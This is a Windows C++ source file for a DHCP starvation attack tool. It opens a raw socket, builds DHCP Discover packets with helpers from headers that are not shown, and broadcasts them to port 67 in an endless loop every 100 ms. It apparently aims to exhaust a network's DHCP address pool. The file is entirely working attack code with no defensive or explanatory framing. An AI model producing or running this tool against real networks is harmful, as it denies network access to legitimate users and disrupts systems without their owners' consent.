#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Packets.h"
#include "Utils.h"

#include <iostream>
#include <winsock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma pack(1)
#pragma comment(lib, "Ws2_32.lib")



void startDHCPStarvation(AddressInfo& info)
{
	
	SOCKET s;
	sockaddr_in dst;
	int optval = 1;

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket

#if _DEBUG
	if (s == SOCKET_ERROR)
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
#endif

	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket

	dst.sin_family = AF_INET;
	dst.sin_port = htons(67);								/* difine the destination */
	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);

	char* raw_packet = new char[65536];

	CreateDHCPDiscoverPacket(raw_packet, info);

	sendto(
		s,
		raw_packet,
		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header) ,
		0, (sockaddr*)&dst, 
		sizeof(dst)
	);
	delete[] raw_packet;
}

int main()
{
	WSADATA wsock;
	WSAStartup(MAKEWORD(2, 2), &wsock);

	AddressInfo info{};
	getAddrInfo(&info);

#if _DEBUG
	std::cout << 
		info.hostName 
		<< "\n" << 
		info.ipv4 
		<< "\n" << 
		info.netmask 
		<< "\n" << 
		info.broadcast 
		<< "\n" <<
		int(info.htype)
		<< std::endl;
#endif
	while (1)
	{
		startDHCPStarvation(info);
		Sleep(100);
	}
}